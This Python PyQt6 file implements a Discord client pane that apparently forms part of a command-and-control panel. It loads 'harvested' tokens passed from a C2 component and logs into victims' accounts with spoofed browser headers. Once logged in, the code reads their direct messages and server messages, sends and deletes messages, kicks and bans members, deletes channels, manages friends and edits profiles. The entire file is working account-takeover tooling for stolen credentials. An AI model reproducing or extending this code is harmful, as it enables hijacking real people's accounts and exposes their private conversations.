# ui/discord_pane.py (Definitive, Full Social Features as a QWidget)

import sys, requests, base64, json, asyncio, threading, websockets, os
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QPushButton, QLineEdit, QListWidget, QTextEdit, QLabel, QStackedWidget,
                             QListWidgetItem, QInputDialog, QMessageBox, QMenu, QSplitter, QDialog,
                             QFileDialog, QTabWidget, QFormLayout, QDialogButtonBox)
from PyQt6.QtGui import QPixmap, QImage, QFont, QIcon, QColor, QBrush, QTextCursor, QTextImageFormat
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QSize, QDateTime, QUrl, QTimer

# --- Global Data Caches ---
server_icon_cache, user_pfp_cache, image_preview_cache = {}, {}, {}

# --- API Worker ---
class ApiWorker(QThread):
    finished = pyqtSignal(dict)
    def __init__(self, token, endpoint, method="GET", payload=None, files=None):
        super().__init__(); self.token, self.endpoint, self.method, self.payload, self.files = token, endpoint, method, payload, files
        x_super_properties = base64.b64encode(json.dumps({ "os": "Windows", "browser": "Chrome", "os_version": "10", "release_channel": "stable"}, separators=(',', ':')).encode()).decode()
        self.headers = { 'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'X-Super-Properties': x_super_properties }
        if not self.files: self.headers['Content-Type'] = 'application/json'
    def run(self):
        try:
            with requests.Session() as s:
                s.headers.update(self.headers); url = f"https://discord.com/api/v9/{self.endpoint}"
                if self.method == "GET": response = s.get(url, timeout=10)
                elif self.method == "POST": response = s.post(url, json=self.payload, files=self.files, timeout=10)
                elif self.method == "PUT": response = s.put(url, json=self.payload, timeout=10)
                elif self.method == "DELETE": response = s.delete(url, timeout=10)
                elif self.method == "PATCH": response = s.patch(url, json=self.payload, timeout=10)
                response.raise_for_status(); self.finished.emit({"success": True, "data": response.json() if response.text else {}})
        except requests.exceptions.RequestException as e: self.finished.emit({"success": False, "error": str(e), "response_text": e.response.text if hasattr(e, 'response') else ''})

# --- Real-Time Gateway Thread ---
class GatewayWorker(QThread):
    new_event = pyqtSignal(dict); log_message = pyqtSignal(str)
    def __init__(self, token): super().__init__(); self.token = token; self._is_running = True; self.websocket = None; self.loop = None
    async def gateway_logic(self):
        uri = "wss://gateway.discord.gg/?v=9&encoding=json"
        async with websockets.connect(uri) as self.websocket:
            hello = json.loads(await self.websocket.recv()); heartbeat_interval = hello['d']['heartbeat_interval'] / 1000
            await self.websocket.send(json.dumps({ "op": 2, "d": { "token": self.token, "properties": { "$os": "windows", "$browser": "chrome", "$device": "pc" }, "presence": {"status": "online", "afk": False}}}))
            asyncio.create_task(self.send_heartbeat(heartbeat_interval))
            while self._is_running:
                try:
                    event = json.loads(await asyncio.wait_for(self.websocket.recv(), timeout=heartbeat_interval + 5))
                    if event.get('t'): self.new_event.emit(event)
                except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed): self.log_message.emit("Gateway connection lost."); break
    async def send_heartbeat(self, interval):
        while self._is_running:
            await asyncio.sleep(interval)
            try: await self.websocket.send(json.dumps({"op": 1, "d": None}))
            except websockets.exceptions.ConnectionClosed: break
    async def subscribe_to_guild(self, guild_id):
        if self.websocket:
            payload = {"op": 8, "d": {"guild_id": guild_id, "query": "", "limit": 0}}
            await self.websocket.send(json.dumps(payload))
    def subscribe_to_guild_threadsafe(self, guild_id):
        if self.loop: self.loop.call_soon_threadsafe(asyncio.create_task, self.subscribe_to_guild(guild_id))
    def run(self):
        self.loop = asyncio.new_event_loop(); asyncio.set_event_loop(self.loop)
        try: self.loop.run_until_complete(self.gateway_logic())
        except Exception as e: self.log_message.emit(f"Gateway thread failed: {e}")
    def stop(self): self._is_running = False

# --- Dialogs ---
class UserProfileDialog(QDialog):
    def __init__(self, user_data, roles_text, parent=None):
        super().__init__(parent); self.setWindowTitle("User Profile"); layout = QVBoxLayout(self); user = user_data.get('user', user_data)
        if user.get('banner_color'): self.setStyleSheet(f"background-color: {user['banner_color']};")
        pfp_label = QLabel(); pfp_label.setFixedSize(128, 128); layout.addWidget(pfp_label)
        avatar_hash = user.get('avatar'); user_id = user.get('id')
        if avatar_hash: threading.Thread(target=lambda: self.load_pfp(f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png", pfp_label), daemon=True).start()
        username = f"{user.get('username')}#{user.get('discriminator')}"
        created_at_ts = (int(user_id) >> 22) + 1420070400000; created_at = QDateTime.fromMSecsSinceEpoch(created_at_ts).toString(Qt.DateFormat.ISODate)
        layout.addWidget(QLabel(f"<h2>{username}</h2>")); layout.addWidget(QLabel(f"<b>User ID:</b> {user_id}")); layout.addWidget(QLabel(f"<b>Account Created:</b> {created_at}"))
        if roles_text: layout.addWidget(QLabel(f"<b>Roles:</b>\n{roles_text}")); self.setLayout(layout)
    def load_pfp(self, url, label):
        try: data = requests.get(url).content; pixmap = QPixmap(); pixmap.loadFromData(data); label.setPixmap(pixmap.scaled(128, 128, Qt.AspectRatioMode.KeepAspectRatio))
        except: pass
class UserSettingsDialog(QDialog):
    def __init__(self, user_data, parent=None):
        super().__init__(parent); self.setWindowTitle("User Settings"); self.layout = QFormLayout(self)
        self.username_input = QLineEdit(user_data.get('username')); self.bio_input = QTextEdit(user_data.get('bio'))
        self.pfp_path = None; self.pfp_button = QPushButton("Select New Profile Picture"); self.pfp_button.clicked.connect(self.select_pfp)
        self.layout.addRow("Username:", self.username_input); self.layout.addRow("About Me:", self.bio_input); self.layout.addRow(self.pfp_button)
        buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Save | QDialogButtonBox.StandardButton.Cancel); buttons.accepted.connect(self.accept); buttons.rejected.connect(self.reject)
        self.layout.addRow(buttons)
    def select_pfp(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Image", "", "Image Files (*.png *.jpg *.jpeg)")
        if path: self.pfp_path = path; self.pfp_button.setText(os.path.basename(path))
    def get_settings(self):
        settings = {"username": self.username_input.text(), "bio": self.bio_input.toPlainText()}
        if self.pfp_path:
            with open(self.pfp_path, 'rb') as f: settings['avatar'] = "data:image/png;base64," + base64.b64encode(f.read()).decode()
        return settings

# --- Main Discord Pane Widget ---
class DiscordPane(QWidget):
    def __init__(self):
        super().__init__()
        self.current_token = None; self.worker_threads = []; self.gateway_thread = None; self.current_user = {}
        self.current_guild_id = None; self.current_channel_id = None; self.current_guild_roles = {}; self.current_members = {}
        self.member_item_map = {}; self.message_map = {}
        
        self.stack = QStackedWidget(self)
        layout = QVBoxLayout(self)
        layout.addWidget(self.stack)

        self.token_entry_screen = QWidget()
        self.main_client_screen = QWidget()
        self.stack.addWidget(self.token_entry_screen)
        self.stack.addWidget(self.main_client_screen)
        
        self.setup_token_entry_ui()
        self.setup_main_client_ui()
        self.stack.setCurrentWidget(self.token_entry_screen)

    def load_token_from_c2(self, token):
        if token:
            self.token_input.setText(token)
            self.load_token()

    def closeEvent(self, event):
        if self.gateway_thread: self.gateway_thread.stop(); self.gateway_thread.wait()
        for worker in self.worker_threads: worker.stop(); worker.wait()
        event.accept()

    def setup_token_entry_ui(self):
        layout = QVBoxLayout(self.token_entry_screen); layout.setAlignment(Qt.AlignmentFlag.AlignCenter); self.token_input = QLineEdit(); self.token_input.setPlaceholderText("Discord Token Harvested..."); self.token_input.setMinimumWidth(400); self.login_button = QPushButton("Load Token"); self.login_button.clicked.connect(self.load_token); self.feedback_label = QLabel(""); layout.addWidget(self.token_input); layout.addWidget(self.login_button); layout.addWidget(self.feedback_label)

    def setup_main_client_ui(self):
        main_layout = QHBoxLayout(self.main_client_screen); main_layout.setContentsMargins(0,0,0,0); main_layout.setSpacing(0)
        self.server_list = QListWidget(); self.server_list.setFixedWidth(70); self.server_list.setIconSize(QSize(50, 50)); self.server_list.itemClicked.connect(self.handle_server_select); main_layout.addWidget(self.server_list)
        splitter = QSplitter(Qt.Orientation.Horizontal); main_layout.addWidget(splitter)
        self.channel_pane_stack = QStackedWidget(); self.channel_pane_stack.setStyleSheet("background-color: #2f3136;")
        server_channel_widget = QWidget(); channel_layout = QVBoxLayout(server_channel_widget); channel_layout.setContentsMargins(0,0,0,0); channel_layout.setSpacing(0)
        self.server_name_label = QLabel(""); self.server_name_label.setStyleSheet("padding: 10px; font-weight: bold; border-bottom: 1px solid #202225;"); channel_layout.addWidget(self.server_name_label)
        self.channel_list = QListWidget(); self.channel_list.itemClicked.connect(self.handle_channel_select); self.channel_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.channel_list.customContextMenuRequested.connect(self.show_channel_context_menu)
        channel_layout.addWidget(self.channel_list)
        home_widget = QWidget(); home_layout = QVBoxLayout(home_widget); home_layout.setContentsMargins(0,0,0,0); home_layout.setSpacing(0)
        home_header_layout = QHBoxLayout(); home_header_layout.setContentsMargins(10,10,10,10)
        home_header_layout.addWidget(QLabel("<b>Home</b>")); home_header_layout.addStretch()
        add_friend_btn = QPushButton("Add Friend"); add_friend_btn.clicked.connect(self.add_friend); home_header_layout.addWidget(add_friend_btn)
        home_layout.addLayout(home_header_layout)
        self.home_tabs = QTabWidget()
        self.dm_list = QListWidget(); self.friends_list = QListWidget(); self.pending_list = QListWidget(); self.blocked_list = QListWidget()
        self.home_tabs.addTab(self.dm_list, "Direct Messages"); self.home_tabs.addTab(self.friends_list, "All Friends"); self.home_tabs.addTab(self.pending_list, "Pending"); self.home_tabs.addTab(self.blocked_list, "Blocked")
        self.dm_list.itemDoubleClicked.connect(self.handle_channel_select)
        self.friends_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.friends_list.customContextMenuRequested.connect(self.show_friend_context_menu)
        self.pending_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.pending_list.customContextMenuRequested.connect(self.show_pending_context_menu)
        self.blocked_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.blocked_list.customContextMenuRequested.connect(self.show_blocked_context_menu)
        home_layout.addWidget(self.home_tabs); self.channel_pane_stack.addWidget(server_channel_widget); self.channel_pane_stack.addWidget(home_widget)
        splitter.addWidget(self.channel_pane_stack)
        chat_pane = QWidget(); chat_layout = QHBoxLayout(chat_pane); chat_layout.setContentsMargins(0,0,0,0); chat_layout.setSpacing(0)
        message_view_widget = QWidget(); message_view_layout = QVBoxLayout(message_view_widget); message_view_layout.setContentsMargins(10,10,10,10)
        self.load_more_button = QPushButton("Load More Messages"); self.load_more_button.clicked.connect(self.load_more_messages); message_view_layout.addWidget(self.load_more_button)
        self.message_view = QTextEdit(); self.message_view.setReadOnly(True); self.message_view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.message_view.customContextMenuRequested.connect(self.show_message_context_menu)
        message_view_layout.addWidget(self.message_view); self.typing_indicator_label = QLabel(""); self.typing_indicator_label.setFixedHeight(20); message_view_layout.addWidget(self.typing_indicator_label)
        message_input_layout = QHBoxLayout(); self.upload_button = QPushButton("+"); self.upload_button.setFixedWidth(30); self.upload_button.clicked.connect(self.upload_file); message_input_layout.addWidget(self.upload_button)
        self.message_input = QLineEdit(); self.message_input.setPlaceholderText("Send a message..."); self.message_input.returnPressed.connect(self.send_message); message_input_layout.addWidget(self.message_input)
        message_view_layout.addLayout(message_input_layout); chat_layout.addWidget(message_view_widget, 3)
        self.member_list = QListWidget(); self.member_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.member_list.customContextMenuRequested.connect(self.show_member_context_menu); self.member_list.setStyleSheet("background-color: #2f3136;")
        chat_layout.addWidget(self.member_list, 1); splitter.addWidget(chat_pane); splitter.setSizes([240, 960])
        user_info_bar = QHBoxLayout(); user_info_bar.setContentsMargins(5,5,5,5); self.user_info_label_small = QLabel("Username"); user_info_bar.addWidget(self.user_info_label_small)
        settings_button = QPushButton("⚙️"); settings_button.setFixedWidth(30); settings_button.clicked.connect(self.open_user_settings); user_info_bar.addWidget(settings_button); channel_layout.addLayout(user_info_bar)
    
    def show_channel_context_menu(self, position):
        menu = QMenu(); create_action = menu.addAction("Create Channel"); delete_action = menu.addAction("Delete Channel"); invite_action = menu.addAction("Create Invite"); action = menu.exec(self.channel_list.mapToGlobal(position)); item = self.channel_list.itemAt(position)
        if action == create_action: self.create_channel()
        elif action == delete_action and item: self.delete_channel(item)
        elif action == invite_action and item: self.create_invite(item)
    def show_member_context_menu(self, position):
        item = self.member_list.itemAt(position);
        if not item or not item.data(Qt.ItemDataRole.UserRole): return
        menu = QMenu(); profile_action = menu.addAction("View Profile"); kick_action = menu.addAction("Kick User"); ban_action = menu.addAction("Ban User"); action = menu.exec(self.member_list.mapToGlobal(position))
        if action == profile_action: self.view_member_profile(item)
        elif action == kick_action: self.kick_member(item)
        elif action == ban_action: self.ban_member(item)
    def show_message_context_menu(self, position):
        menu = QMenu(); last_own_message = next((msg for msg in reversed(self.message_map.values()) if msg['author']['id'] == self.current_user['id']), None)
        if last_own_message:
            edit_action = menu.addAction("Edit Last Message"); edit_action.triggered.connect(lambda: self.edit_message(last_own_message))
            delete_action = menu.addAction("Delete Last Message"); delete_action.triggered.connect(lambda: self.delete_message(last_own_message))
        menu.exec(self.message_view.mapToGlobal(position))
    def show_friend_context_menu(self, position):
        item = self.friends_list.itemAt(position);
        if not item: return
        menu = QMenu(); remove_action = menu.addAction("Remove Friend"); menu.exec(self.friends_list.mapToGlobal(position))
        if remove_action: self.remove_friend(item.data(Qt.ItemDataRole.UserRole)['id'])
    def show_pending_context_menu(self, position):
        item = self.pending_list.itemAt(position);
        if not item: return
        menu = QMenu(); accept_action = menu.addAction("Accept"); deny_action = menu.addAction("Deny"); action = menu.exec(self.pending_list.mapToGlobal(position))
        user_id = item.data(Qt.ItemDataRole.UserRole)['id']
        if action == accept_action: self.accept_friend_request(user_id)
        elif action == deny_action: self.remove_friend(user_id)
    def show_blocked_context_menu(self, position):
        item = self.blocked_list.itemAt(position);
        if not item: return
        menu = QMenu(); unblock_action = menu.addAction("Unblock"); menu.exec(self.blocked_list.mapToGlobal(position))
        if unblock_action: self.remove_friend(item.data(Qt.ItemDataRole.UserRole)['id'])
    
    def create_channel(self):
        if not self.current_guild_id or self.current_guild_id == "dms": return
        name, ok = QInputDialog.getText(self, "Create Channel", "Enter new channel name:")
        if ok and name: self.fetch_api_data(f"guilds/{self.current_guild_id}/channels", self.refresh_current_server_view, method="POST", payload={"name": name, "type": 0})
    def delete_channel(self, item):
        channel_id = item.data(Qt.ItemDataRole.UserRole)['id']
        if QMessageBox.question(self, "Confirm Delete", f"Delete channel '{item.text()}'?") == QMessageBox.StandardButton.Yes: self.fetch_api_data(f"channels/{channel_id}", self.refresh_current_server_view, method="DELETE")
    def create_invite(self, item):
        channel_id = item.data(Qt.ItemDataRole.UserRole)['id']; self.fetch_api_data(f"channels/{channel_id}/invites", self.handle_invite_response, method="POST", payload={"max_age": 86400})
    def view_member_profile(self, item):
        member_data = item.data(Qt.ItemDataRole.UserRole); role_ids = member_data['roles']
        role_names = [self.current_guild_roles.get(role_id, {}).get('name', 'Unknown') for role_id in role_ids] or ["No roles"]; dialog = UserProfileDialog(member_data, "\n".join(role_names), self); dialog.exec()
    def kick_member(self, item):
        member_data = item.data(Qt.ItemDataRole.UserRole); user = member_data['user']
        if QMessageBox.question(self, "Confirm Kick", f"Kick member '{user['username']}'?") == QMessageBox.StandardButton.Yes: self.fetch_api_data(f"guilds/{self.current_guild_id}/members/{user['id']}", self.handle_generic_response, method="DELETE")
    def ban_member(self, item):
        member_data = item.data(Qt.ItemDataRole.UserRole); user = member_data['user']
        reason, ok = QInputDialog.getText(self, "Confirm Ban", f"Enter reason for banning '{user['username']}':")
        if ok: self.fetch_api_data(f"guilds/{self.current_guild_id}/bans/{user['id']}", self.handle_generic_response, method="PUT", payload={"reason": reason})
    def load_more_messages(self):
        if not self.current_channel_id or not self.message_map: return
        oldest_message_id = list(self.message_map.keys())[0]; self.fetch_api_data(f"channels/{self.current_channel_id}/messages?limit=50&before={oldest_message_id}", self.prepend_messages)
    def upload_file(self):
        if not self.current_channel_id: return
        file_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if file_path:
            with open(file_path, 'rb') as f: files = {'file': (os.path.basename(file_path), f.read())}; self.fetch_api_data(f"channels/{self.current_channel_id}/messages", self.handle_generic_response, method="POST", files=files)
    def edit_message(self, message):
        new_content, ok = QInputDialog.getText(self, "Edit Message", "Enter new content:", text=message['content'])
        if ok and new_content: self.fetch_api_data(f"channels/{message['channel_id']}/messages/{message['id']}", self.handle_generic_response, method="PATCH", payload={"content": new_content})
    def delete_message(self, message):
        if QMessageBox.question(self, "Confirm Delete", "Delete this message?") == QMessageBox.StandardButton.Yes: self.fetch_api_data(f"channels/{message['channel_id']}/messages/{message['id']}", self.handle_generic_response, method="DELETE")
    def open_user_settings(self):
        dialog = UserSettingsDialog(self.current_user, self)
        if dialog.exec():
            settings = dialog.get_settings()
            password, ok = QInputDialog.getText(self, "Confirm Changes", "Enter your password to save changes:", QLineEdit.EchoMode.Password)
            if ok and password:
                payload = {**settings, "password": password}
                self.fetch_api_data('users/@me', self.handle_generic_response, method="PATCH", payload=payload)
    def add_friend(self):
        text, ok = QInputDialog.getText(self, "Add Friend", "Enter username#discriminator (e.g., user#1234):")
        if ok and text and '#' in text:
            username, discriminator = text.split('#'); payload = {"username": username, "discriminator": int(discriminator)}
            self.fetch_api_data('users/@me/relationships', self.handle_generic_response, method="POST", payload=payload)
    def accept_friend_request(self, user_id):
        self.fetch_api_data(f"users/@me/relationships/{user_id}", self.handle_generic_response, method="PUT", payload={})
    def remove_friend(self, user_id):
        self.fetch_api_data(f"users/@me/relationships/{user_id}", self.handle_generic_response, method="DELETE")
        
    def load_token(self):
        token = self.token_input.text().strip().replace('"', '');
        if not token: self.feedback_label.setText("Token cannot be empty."); return
        self.current_token = token; self.feedback_label.setText("Connecting...")
        self.fetch_api_data('users/@me', self.handle_initial_user_load)
        if self.gateway_thread: self.gateway_thread.stop()
        self.gateway_thread = GatewayWorker(self.current_token); self.gateway_thread.new_event.connect(self.handle_gateway_event)
        self.gateway_thread.start()
        self.fetch_api_data('users/@me/guilds', self.populate_servers); self.stack.setCurrentWidget(self.main_client_screen)
    def fetch_api_data(self, endpoint, callback_function, method="GET", payload=None, files=None):
        worker = ApiWorker(self.current_token, endpoint, method, payload, files); worker.finished.connect(callback_function); self.worker_threads.append(worker); worker.start()
    def handle_initial_user_load(self, result):
        if result["success"]: self.current_user = result["data"]; self.user_info_label_small.setText(self.current_user['username'])
    def populate_servers(self, result):
        self.server_list.clear()
        if not result["success"]: QMessageBox.critical(self, "Error", f"Failed to load servers: {result['error']}"); return
        dm_item = QListWidgetItem(QIcon(), "DMs"); dm_item.setData(Qt.ItemDataRole.UserRole, {"id": "dms", "name": "Direct Messages"}); self.server_list.addItem(dm_item)
        for server in result["data"]:
            item = QListWidgetItem(server['name']); item.setData(Qt.ItemDataRole.UserRole, server); self.server_list.addItem(item)
            if server.get('icon'): threading.Thread(target=self.load_icon, args=(f"https://cdn.discordapp.com/icons/{server['id']}/{server['icon']}.png", server['icon'], item, server_icon_cache), daemon=True).start()
    def load_icon(self, url, key, item, cache):
        try: data = requests.get(url).content; pixmap = QPixmap(); pixmap.loadFromData(data); cache[key] = QIcon(pixmap); item.setIcon(cache[key])
        except: pass
    def handle_server_select(self, item): self.refresh_current_server_view(item)
    def refresh_current_server_view(self, item=None):
        if item is None: item = self.server_list.currentItem()
        if not item: return
        server_data = item.data(Qt.ItemDataRole.UserRole); self.current_guild_id = server_data.get('id'); self.server_name_label.setText(server_data.get('name'))
        self.message_view.clear(); self.member_list.clear(); self.current_guild_roles.clear()
        if self.gateway_thread and self.current_guild_id != 'dms': self.gateway_thread.subscribe_to_guild_threadsafe(self.current_guild_id)
        if self.current_guild_id == "dms": self.channel_pane_stack.setCurrentIndex(1); self.fetch_api_data('users/@me/relationships', self.populate_home_lists); self.fetch_api_data('users/@me/channels', self.populate_dm_channels)
        else:
            self.channel_pane_stack.setCurrentIndex(0); self.fetch_api_data(f"guilds/{self.current_guild_id}/channels", self.populate_channels); self.fetch_api_data(f"guilds/{self.current_guild_id}/roles", self.populate_roles)
    def populate_roles(self, result):
        if result["success"]: self.current_guild_roles = {role['id']: role for role in result["data"]}
    def populate_channels(self, result):
        self.channel_list.clear()
        if result["success"]:
            channels = result["data"]; categories = {c['id']: [] for c in channels if c['type'] == 4}
            for channel in channels:
                if channel.get('parent_id') in categories: categories[channel['parent_id']].append(channel)
            for category in sorted([c for c in channels if c['type'] == 4], key=lambda x: x.get('position', 0)):
                cat_item = QListWidgetItem(category['name'].upper()); cat_item.setFlags(Qt.ItemFlag.NoItemFlags); cat_item.setForeground(QColor("#96989d")); self.channel_list.addItem(cat_item)
                for channel in sorted(categories.get(category['id'], []), key=lambda x: x.get('position', 0)):
                    if channel['type'] == 0: item = QListWidgetItem(f"  # {channel['name']}"); item.setData(Qt.ItemDataRole.UserRole, channel); self.channel_list.addItem(item)
    def populate_home_lists(self, result):
        self.friends_list.clear(); self.pending_list.clear(); self.blocked_list.clear()
        if result["success"]:
            for rel in result["data"]:
                user = rel['user']; username = f"{user['username']}#{user['discriminator']}"
                item = QListWidgetItem(username); item.setData(Qt.ItemDataRole.UserRole, rel)
                if rel['type'] == 1: self.friends_list.addItem(item)
                elif rel['type'] == 3: item.setText(f"{username} (Incoming)"); self.pending_list.addItem(item)
                elif rel['type'] == 2: self.blocked_list.addItem(item)
    def populate_dm_channels(self, result):
        self.dm_list.clear()
        if result["success"]:
            for dm in result["data"]:
                if dm['type'] == 1:
                    recipients = ", ".join([u['username'] for u in dm['recipients']])
                    item = QListWidgetItem(recipients); item.setData(Qt.ItemDataRole.UserRole, dm); self.dm_list.addItem(item)
    def handle_channel_select(self, item):
        channel_data = item.data(Qt.ItemDataRole.UserRole);
        if not channel_data or not channel_data.get('id'): return
        self.current_channel_id = channel_data['id']
        self.fetch_api_data(f"channels/{self.current_channel_id}/messages?limit=50", self.populate_messages)
    def populate_messages(self, result):
        self.message_view.clear(); self.message_map.clear()
        if result["success"]:
            self.current_messages = result["data"]
            for message in reversed(result["data"]): self.append_message_to_view(message)
    def prepend_messages(self, result):
        if result["success"]:
            current_html = self.message_view.toHtml(); prepended_html = ""
            for message in reversed(result["data"]):
                self.message_map[message['id']] = message
                author = message['author']['username']; timestamp = message.get('timestamp', '')[:19].replace("T", " "); content = message['content']
                prepended_html += f"<p><b>[{timestamp}] {author}:</b> {content}</p>"
            self.message_view.setHtml(prepended_html + current_html)
    def handle_generic_response(self, result):
        if result["success"]: QMessageBox.information(self, "Success", "Action completed successfully.")
        else: QMessageBox.critical(self, "Error", f"Action failed: {result.get('error')}\n\n{result.get('response_text')}")
    def send_message(self):
        message_text = self.message_input.text().strip()
        if not message_text or not self.current_channel_id: return
        self.fetch_api_data(f"channels/{self.current_channel_id}/messages", self.handle_send_response, method="POST", payload={"content": message_text})
        self.message_input.clear()
    def handle_send_response(self, result):
        if result["success"]: self.append_message_to_view(result["data"])
    def handle_invite_response(self, result):
        if result["success"]: QMessageBox.information(self, "Invite Created", f"Invite Link:\nhttps://discord.gg/{result['data'].get('code')}")
    def handle_gateway_event(self, event):
        event_type, data = event.get('t'), event.get('d')
        if event_type == "MESSAGE_CREATE" and data.get('channel_id') == self.current_channel_id: self.append_message_to_view(data)
        elif event_type in ["MESSAGE_UPDATE", "MESSAGE_DELETE"] and data.get('channel_id') == self.current_channel_id: self.fetch_api_data(f"channels/{self.current_channel_id}/messages?limit=50", self.populate_messages)
        elif event_type == "PRESENCE_UPDATE": self.handle_presence_update(data)
        elif event_type == "GUILD_MEMBERS_CHUNK": self.populate_members_chunk(data)
        elif event_type == "TYPING_START" and data.get('channel_id') == self.current_channel_id: self.handle_typing_start(data)
    def handle_presence_update(self, data):
        user_id = data['user']['id']; status = data['status']; status_map = {"online": "🟢", "idle": "🌙", "dnd": "⛔"}
        if user_id in self.member_item_map:
            item = self.member_item_map[user_id]; text = item.text().lstrip('🟢🌙⛔ '); item.setText(f"{status_map.get(status, '')} {text}")
            if status == "offline": item.setForeground(QColor("grey"))
            else:
                member_data = item.data(Qt.ItemDataRole.UserRole)
                role_color_val = next((self.current_guild_roles.get(rid, {}).get('color') for rid in member_data['roles'] if self.current_guild_roles.get(rid, {}).get('color') != 0), None)
                if role_color_val: item.setForeground(QBrush(QColor(f"#{role_color_val:06x}")));
                else: item.setForeground(QColor("#dcddde"))
    def handle_typing_start(self, data):
        user_id = data.get('user_id')
        if user_id in self.current_members:
            username = self.current_members[user_id]['user']['username']
            self.typing_indicator_label.setText(f"{username} is typing...")
            QTimer.singleShot(5000, lambda: self.typing_indicator_label.clear())
    def append_message_to_view(self, message):
        author = message['author']['username']; timestamp = message.get('timestamp', '')[:19].replace("T", " "); content = message['content']
        self.message_map[message['id']] = message
        self.message_view.append(f"<b>[{timestamp}] {author}:</b> {content}")
        for embed in message.get('embeds', []):
            if embed.get('thumbnail') and embed['thumbnail'].get('url'): threading.Thread(target=self.insert_image_from_url, args=(embed['thumbnail']['url'],), daemon=True).start()
        for attachment in message.get('attachments', []):
            if "image" in attachment.get('content_type', ''): threading.Thread(target=self.insert_image_from_url, args=(attachment['url'],), daemon=True).start()
    def insert_image_from_url(self, url):
        try:
            if url in image_preview_cache: image = image_preview_cache[url]
            else: data = requests.get(url).content; image = QImage(); image.loadFromData(data); image_preview_cache[url] = image
            cursor = self.message_view.textCursor(); cursor.movePosition(QTextCursor.MoveOperation.End); cursor.insertText("\n")
            cursor.insertImage(image.scaledToWidth(300, Qt.TransformationMode.SmoothTransformation)); self.message_view.append("")
        except: pass
    def populate_members_chunk(self, data):
        if data.get('guild_id') != self.current_guild_id: return
        for member_data in data.get('members', []): self.current_members[member_data['user']['id']] = member_data
        self.redraw_member_list()
    def redraw_member_list(self):
        self.member_list.clear(); self.member_item_map.clear()
        roles_by_pos = sorted([r for r in self.current_guild_roles.values() if r['color'] != 0], key=lambda r: r['position'], reverse=True)
        members_by_role = {"Online": []}; [members_by_role.setdefault(role['name'], []) for role in roles_by_pos]
        for member_data in self.current_members.values():
            highest_role_name = "Online"
            for role in roles_by_pos:
                if role['id'] in member_data['roles']: highest_role_name = role['name']; break
            members_by_role[highest_role_name].append(member_data)
        for role_name, members in members_by_role.items():
            if not members: continue
            role_header = QListWidgetItem(f"{role_name} - {len(members)}"); role_header.setFlags(Qt.ItemFlag.NoItemFlags); role_header.setForeground(QColor("#96989d")); self.member_list.addItem(role_header)
            for member_data in sorted(members, key=lambda m: m['user']['username'].lower()):
                user = member_data['user']; item = QListWidgetItem(f"  {user['username']}#{user['discriminator']}")
                role_color_val = next((self.current_guild_roles.get(rid, {}).get('color') for rid in member_data['roles'] if self.current_guild_roles.get(rid, {}).get('color') != 0), None)
                if role_color_val: item.setForeground(QBrush(QColor(f"#{role_color_val:06x}")))
                item.setData(Qt.ItemDataRole.UserRole, member_data); self.member_list.addItem(item)
                self.member_item_map[user['id']] = item